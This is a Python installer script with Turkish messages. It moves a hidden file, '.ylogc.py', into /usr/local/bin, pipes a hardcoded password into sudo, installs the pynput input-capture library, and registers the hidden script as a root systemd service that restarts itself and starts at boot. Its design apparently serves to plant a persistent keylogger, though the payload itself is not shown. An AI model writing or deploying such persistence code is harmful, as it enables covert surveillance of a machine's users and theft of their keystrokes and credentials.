import os

def downloadRequirements():
    try:
        os.system('echo "1" | sudo -S apt-get install -y python3-pathlib && sudo -S apt-get install -y pynput && sudo -S apt-get install -y datetime')
        print("Başarılı!")
    except Exception as e:
        print(type(e), str(e))

def createService():
    with open("/etc/systemd/system/ylogc_service.service", "w") as file:
        file.write("""[Unit]
Description=M ylogc service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/.ylogc.py
User=root
Group=root
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target""")

    print("Başlangıç dosyası başarıyla oluşturuldu")

def enableService():
    try:
        os.system('echo "1" | sudo -S systemctl daemon-reload')
        os.system('echo "1" | sudo -S systemctl enable ylogc_service.service')
        os.system('echo "1" | sudo -S systemctl start ylogc_service.service')
    except Exception as e:
        print(type(e), str(e))
    
    print("Servis etkinleştirildi. Servisin durumunu kontrol etmek için:\nsudo systemctl status ylogc_service.service\nsudo journalctl -u ylogc_service.service")


def main():
    os.system('echo "1" | sudo -S mv .ylogc.py /usr/local/bin/')
    os.system('echo "1" | sudo -S chmod +x /usr/local/bin/.ylogc.py')

    downloadRequirements()
    createService()
    enableService()

if __name__ == "__main__":
    main()
